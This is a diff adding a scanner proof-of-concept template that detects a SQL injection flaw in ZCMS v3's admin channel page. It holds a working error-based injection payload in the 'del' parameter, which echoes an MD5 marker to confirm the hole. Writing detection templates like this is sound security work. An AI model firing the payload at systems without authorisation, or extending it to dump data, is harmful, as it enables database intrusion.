@@ -1,0 +1,12 @@
+name: poc-yaml-zcms-v3-sqli
+rules:
+  - method: GET
+    path: >-
+      /admin/cms_channel.php?del=123456+AND+(SELECT+1+FROM(SELECT+COUNT(*)%2cCONCAT(0x7e%2cmd5(202072102)%2c0x7e%2cFLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.CHARACTER_SETS+GROUP+BY+x)a)--%2b
+    follow_redirects: true
+    expression: |
+      response.status == 200 && response.body.bcontains(b"6f7c6dcbc380aac3bcba1f9fccec991e")
+detail:
+  author: MaxSecurity(https://github.com/MaxSecurity)
+  links:
+    - https://www.anquanke.com/post/id/183241
